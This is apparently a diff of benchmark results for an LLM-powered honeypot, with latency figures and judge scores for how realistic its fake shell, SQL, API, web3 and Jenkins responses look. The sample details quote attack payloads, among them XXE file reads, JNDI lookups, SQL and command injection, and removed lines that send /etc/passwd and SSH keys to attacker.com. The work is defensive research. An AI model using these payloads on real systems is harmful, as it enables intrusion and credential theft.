@@ -4,7 +4,7 @@
     "judge_model": "meta-llama/llama-3.1-70b-instruct",
     "static_trials": 30,
     "dynamic_latency_trials": 20,
-    "diversity_dataset_size": 200,
+    "diversity_dataset_size": 1328,
     "judge_sample_size": 30
   },
   "latency": {
@@ -17,252 +17,252 @@
       "n": 30
     },
     "dynamic": {
-      "mean_s": 2.0555,
-      "median_s": 1.8019,
-      "stdev_s": 1.1252,
-      "min_s": 0.8219,
-      "max_s": 5.4935,
+      "mean_s": 1.9525,
+      "median_s": 1.6943,
+      "stdev_s": 0.6795,
+      "min_s": 0.9938,
+      "max_s": 3.7015,
       "n": 20
     }
   },
   "throughput_rps": {
     "static": 3333.33,
-    "dynamic_sequential": 0.4865
+    "dynamic_sequential": 0.5122
   },
   "concurrent_throughput": {
     "concurrency_level": 10,
-    "wall_time_s": 6.1596,
-    "throughput_rps": 1.6235,
+    "wall_time_s": 3.2787,
+    "throughput_rps": 3.05,
     "per_request_latency": {
-      "mean_s": 3.0884,
-      "median_s": 2.5445,
-      "stdev_s": 1.4128,
-      "min_s": 1.943,
-      "max_s": 6.1578,
+      "mean_s": 2.6206,
+      "median_s": 2.5745,
+      "stdev_s": 0.5087,
+      "min_s": 1.8435,
+      "max_s": 3.2776,
       "n": 10
     }
   },
   "response_diversity_by_service": {
     "api": {
-      "n": 40,
-      "distinct": 28,
-      "uniqueness_ratio": 0.7
+      "n": 300,
+      "distinct": 138,
+      "uniqueness_ratio": 0.46
     },
     "ssh": {
-      "n": 40,
-      "distinct": 37,
-      "uniqueness_ratio": 0.925
+      "n": 500,
+      "distinct": 482,
+      "uniqueness_ratio": 0.964
     },
     "sql": {
-      "n": 40,
-      "distinct": 40,
-      "uniqueness_ratio": 1.0
+      "n": 500,
+      "distinct": 489,
+      "uniqueness_ratio": 0.978
     },
     "web3": {
-      "n": 40,
-      "distinct": 32,
-      "uniqueness_ratio": 0.8
+      "n": 18,
+      "distinct": 15,
+      "uniqueness_ratio": 0.833
     },
     "cicd": {
-      "n": 40,
-      "distinct": 36,
-      "uniqueness_ratio": 0.9
+      "n": 10,
+      "distinct": 10,
+      "uniqueness_ratio": 1.0
     }
   },
-  "avg_response_words_dynamic": 8.6,
+  "avg_response_words_dynamic": 13.1,
   "llm_judge_realism": {
-    "mean_score_1to5": 4.03,
-    "stdev": 1.5,
+    "mean_score_1to5": 3.37,
+    "stdev": 1.92,
     "n_scored": 30,
     "n_requested": 30,
     "distribution": {
-      "1": 4,
-      "2": 2,
-      "3": 2,
-      "4": 3,
-      "5": 19
+      "1": 10,
+      "2": 3,
+      "3": 0,
+      "4": 0,
+      "5": 17
     }
   },
   "judge_sample_details": [
     {
       "service": "api",
-      "payload": "<!ENTITY % SuperClass '> #45085739",
-      "score": 3,
-      "reason": "Generic error message, but a real API might provide more specific details about the invalid input."
+      "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!E",
+      "score": 1,
+      "reason": "Response is too generic and doesn't resemble a typical API error response."
     },
     {
       "service": "ssh",
-      "payload": "| whoa${x}mi #a5579934",
+      "payload": "%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IYDPRO%29%20%26%26%20str1%3D%24%7B",
+      "score": 5,
+      "reason": "The response is a realistic bash error message for an invalid command."
+    },
+    {
+      "service": "api",
+      "payload": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]> #",
+      "score": 1,
+      "reason": "Response is a generic, templated error message with no relation to the XML payload."
+    },
+    {
+      "service": "sql",
+      "payload": "to_timestamp_tz /*7dd8937a*/",
+      "score": 5,
+      "reason": "The response is a valid SQL query that a real PostgreSQL server would produce when encountering an unknown function like to_timestamp_tz."
+    },
+    {
+      "service": "sql",
+      "payload": "OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDN",
+      "score": 5,
+      "reason": "The error message accurately reflects the syntax error and includes the correct error code and line number."
+    },
+    {
+      "service": "api",
+      "payload": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" > #46831397",
+      "score": 1,
+      "reason": "Generic error message with no relation to the XXE payload"
+    },
+    {
+      "service": "sql",
+      "payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RI",
+      "score": 5,
+      "reason": "The response is a genuine PostgreSQL error message with correct syntax and formatting."
+    },
+    {
+      "service": "ssh",
+      "payload": "%3B%20str%3D%24%28echo%20ZSSQMT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202",
+      "score": 5,
+      "reason": "The response accurately reflects a real bash shell's error message when encountering an invalid command."
+    },
+    {
+      "service": "sql",
+      "payload": ";CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL",
+      "score": 5,
+      "reason": "The error message is specific and matches the syntax error in the query, consistent with a real PostgreSQL server's response."
+    },
+    {
+      "service": "sql",
+      "payload": "CREATE TABLE pwn.shell (code TEXT); /*81bf1914*/",
+      "score": 5,
+      "reason": "The response is a standard PostgreSQL create table confirmation message."
+    },
+    {
+      "service": "api",
+      "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\"> #961ecdaa",
+      "score": 1,
+      "reason": "Response is too generic and explicitly states the request is malicious."
+    },
+    {
+      "service": "ssh",
+      "payload": "%7C%20%5B%203%20-ne%20%24%28echo%20GJJXKM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20w",
+      "score": 5,
+      "reason": "The response accurately reflects the output of a real bash shell executing the payload, including the job control messages."
+    },
+    {
+      "service": "ssh",
+      "payload": "%22%26%26echo%20BCDGJZ$((39%2B25))$(echo%20BCDGJZ)BCDGJZ #b7adc627",
+      "score": 5,
+      "reason": "The response accurately executes the payload's commands and returns the expected output, including the correct arithmetic calculation and file creation."
+    },
+    {
+      "service": "ssh",
+      "payload": "%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%",
+      "score": 5,
+      "reason": "The response is a genuine bash error message with correct syntax and formatting."
+    },
+    {
+      "service": "sql",
+      "payload": "\") or true-- /*3c21be79*/",
+      "score": 5,
+      "reason": "The response is a valid SQL query that reflects the injected payload, indicating a realistic SQL server behavior."
+    },
+    {
+      "service": "sql",
+      "payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) /*445dcc29*/",
+      "score": 5,
+      "reason": "The response is a standard PostgreSQL error message with correct syntax and formatting."
+    },
+    {
+      "service": "ssh",
+      "payload": "%2522%7C%20%5B%209%20-ne%20%24%28echo%20JLFVEC%20%7C%20tr%20-d%20%27%5Cn%27%20%7",
+      "score": 5,
+      "reason": "The response accurately reflects the expected output of a real SSH shell executing the provided payload."
+    },
+    {
+      "service": "api",
+      "payload": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/",
+      "score": 1,
+      "reason": "Contains an explicit disclaimer about not generating harmful responses."
+    },
+    {
+      "service": "ssh",
+      "payload": "%7C%20%5B%208%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20w",
       "score": 5,
       "reason": "The response is a typical bash error message for an unknown command."
     },
     {
-      "service": "sql",
-      "payload": "COPY (SELECT 'malicious') TO '/tmp/test'; /*a9a9033c*/",
+      "service": "ssh",
+      "payload": "%2522%3B%20str%3D%24%28echo%20PRACFZ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5",
       "score": 5,
-      "reason": "The response is a realistic PostgreSQL error message with a specific error code and a helpful hint."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> #23613a08",
-      "score": 1,
-      "reason": "The response is a generic, unrelated chatbot-like answer."
+      "reason": "The response accurately reflects the expected behavior of a real bash shell encountering a malformed input with null bytes."
     },
     {
       "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getCode\", \"params\": [\"0xContract\", \"latest\"], ",
+      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"debug_traceTransaction\", \"params\": [\"0xTransaction",
       "score": 5,
-      "reason": "The response is a valid, properly formatted Ethereum bytecode."
-    },
-    {
-      "service": "ssh",
-      "payload": "; whoa\\mi #4edee2f2",
-      "score": 5,
-      "reason": "The response accurately mimics a real SSH shell's error messages for unknown commands."
+      "reason": "The response is a valid JSON-RPC response with a plausible result value for a debug_traceTransaction call."
     },
     {
       "service": "api",
-      "payload": "<!ENTITY % pe_4 \"&#37;pe_3;<!----> #7f54e0fe",
+      "payload": "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> #b7",
+      "score": 1,
+      "reason": "The response is a generic, templated error message that does not resemble a typical API error response."
+    },
+    {
+      "service": "api",
+      "payload": "<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]> #",
+      "score": 2,
+      "reason": "Generic error message without any specific details or context."
+    },
+    {
+      "service": "ssh",
+      "payload": "%2527%3B%20str%3D%24%28echo%20BVJEPJ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5",
+      "score": 5,
+      "reason": "The response accurately reflects the expected syntax errors and command not found messages from a real bash shell."
+    },
+    {
+      "service": "api",
+      "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> #81a5ee75",
+      "score": 1,
+      "reason": "Response contains an obvious AI disclaimer."
+    },
+    {
+      "service": "api",
+      "payload": "<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]> #5d6eae20",
       "score": 2,
       "reason": "Generic error message without any specific details or XML parsing error indication."
     },
     {
-      "service": "cicd",
-      "payload": "{\"endpoint\": \"/computer/(master)/config.xml\", \"method\": \"POST\", \"note\": \"agent-t",
-      "score": 4,
-      "reason": "Response is well-formed XML, but lacks specific details and attributes typically found in a real Jenkins master node configuration."
+      "service": "api",
+      "payload": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\"> #bfd03686",
+      "score": 1,
+      "reason": "The response is too generic and does not acknowledge the XML External Entity (XXE) injection attempt."
     },
     {
       "service": "api",
-      "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\"> #20142115",
+      "payload": "<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///c:/boot.ini\"><!ENTITY % dtd SYST",
       "score": 1,
-      "reason": "Response is too generic and does not resemble a typical API error message."
+      "reason": "The response is a generic error message that does not acknowledge the XML payload or the XXE attack."
     },
     {
-      "service": "cicd",
-      "payload": "{\"endpoint\": \"/pluginManager/installNecessaryPlugins\", \"method\": \"POST\", \"plugin",
-      "score": 4,
-      "reason": "Lacks specific error handling or plugin validation expected from a real Jenkins server."
-    },
-    {
-      "service": "api",
-      "payload": "1. `<!ENTITY % file SYSTEM \"file:///etc/passwd\">` #e6643a15",
-      "score": 1,
-      "reason": "The response is too generic and does not reflect the typical error handling of a real API when encountering an XML External Entity (XXE) attack."
-    },
-    {
-      "service": "ssh",
-      "payload": "|| awk 'BEGIN {system(\"id\")}' #6e29e17f",
-      "score": 5,
-      "reason": "The response is a valid and correctly formatted output of the id command, matching what a real SSH server would produce."
-    },
-    {
-      "service": "ssh",
-      "payload": "&& cat /etc/passwd | curl -X POST -d @- http://attacker.com #fc6bf8fe",
+      "service": "web3",
+      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"miner_start\", \"params\": [4], \"id\": 1} #3f1e3a8e",
       "score": 2,
-      "reason": "Real bash would not produce a syntax error for a valid command, even if it's a malicious one."
+      "reason": "The response is too generic and lacks specific details that a real Ethereum node would provide, such as the actual mining status or an error message."
     },
     {
-      "service": "cicd",
-      "payload": "{\"endpoint\": \"/script\", \"method\": \"POST\", \"script\": \"println(['cat','/var/lib/je",
-      "score": 5,
-      "reason": "The response is a realistic Java exception stacktrace with a plausible error message."
-    },
-    {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"eth_getBalance\", \"params\": [\"0xTargetAccount\", \"la",
-      "score": 5,
-      "reason": "The response is a valid JSON-RPC response with a plausible balance value."
-    },
-    {
-      "service": "cicd",
-      "payload": "{\"endpoint\": \"/script\", \"method\": \"POST\", \"script\": \"println(['id'].execute().te",
-      "score": 4,
-      "reason": "Lack of actual output from the executed script, but otherwise plausible Jenkins-like response."
-    },
-    {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"admin_addPeer\", \"params\": [\"enode://malicious@10.0",
-      "score": 5,
-      "reason": "The response is a valid JSON-RPC response with a null result, which is a plausible outcome for an admin_addPeer method."
-    },
-    {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"personal_unlockAccount\", \"params\": [\"0xVictimAccou",
-      "score": 5,
-      "reason": "The response is a valid and expected JSON-RPC response for a successful account unlock."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY % pe_3 \"&#37;pe_2;<!----> #b0c72677",
-      "score": 3,
-      "reason": "Generic error message without specific details about the XML parsing error"
-    },
-    {
-      "service": "web3",
-      "payload": "{\"jsonrpc\": \"2.0\", \"method\": \"eth_call\", \"params\": [{\"to\": \"0xContract\", \"data\":",
-      "score": 5,
-      "reason": "The response is a valid JSON-RPC response with a plausible result value for an eth_call method."
-    },
-    {
-      "service": "api",
-      "payload": "${jndi:ldap://${sys:java.vendor}.domain/a} #e5a37f12",
+      "service": "ssh",
+      "payload": "%0aecho%20COCDTZ$((30%2B94))$(echo%20COCDTZ)COCDTZ%2F%2F #06db68c1",
       "score": 1,
-      "reason": "Generic error message with no specific details or context"
-    },
-    {
-      "service": "ssh",
-      "payload": "|| php -r 'system(\"id\");' #36b7dd29",
-      "score": 5,
-      "reason": "The response is a valid and detailed 'id' command output, matching the expected format of a real Linux system."
-    },
-    {
-      "service": "ssh",
-      "payload": "|| wget #028311dc",
-      "score": 5,
-      "reason": "The response is a realistic wget output, including a timestamp, URL resolution, and connection details."
-    },
-    {
-      "service": "ssh",
-      "payload": "; cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com #d1ac430d",
-      "score": 5,
-      "reason": "The response accurately reflects the expected behavior of a real bash shell encountering a permission error and a failed DNS resolution."
-    },
-    {
-      "service": "ssh",
-      "payload": "; df -h #d2d5c6b0",
-      "score": 5,
-      "reason": "The response is a realistic output of the df command, including the correct format and typical filesystem information."
-    },
-    {
-      "service": "api",
-      "payload": "<!ENTITY a0 \"dos\" > #74684784",
-      "score": 5,
-      "reason": "A real API would likely reject malformed input with a similar error message."
-    },
-    {
-      "service": "sql",
-      "payload": "SELECT @@VERSION, USER(), DATABASE(); /*42efef5e*/",
-      "score": 5,
-      "reason": "The response matches the exact format and content expected from a real PostgreSQL server."
-    },
-    {
-      "service": "sql",
-      "payload": "SELECT user FROM dual; /*09c36d5e*/",
-      "score": 5,
-      "reason": "The response is a realistic PostgreSQL error message with correct syntax highlighting."
-    },
-    {
-      "service": "ssh",
-      "payload": "|| sleep 10 #fc784242",
-      "score": 5,
-      "reason": "The response is a realistic bash job control message."
-    },
-    {
-      "service": "sql",
-      "payload": "' AND (SELECT 1 FROM (SELECT(pg_sleep(5)))a)-- /*13e29860*/",
-      "score": 5,
-      "reason": "The response is a genuine PostgreSQL error message with correct syntax and formatting."
+      "reason": "Response is a direct echo of the payload with no actual command execution or error handling."
     }
   ]
 }
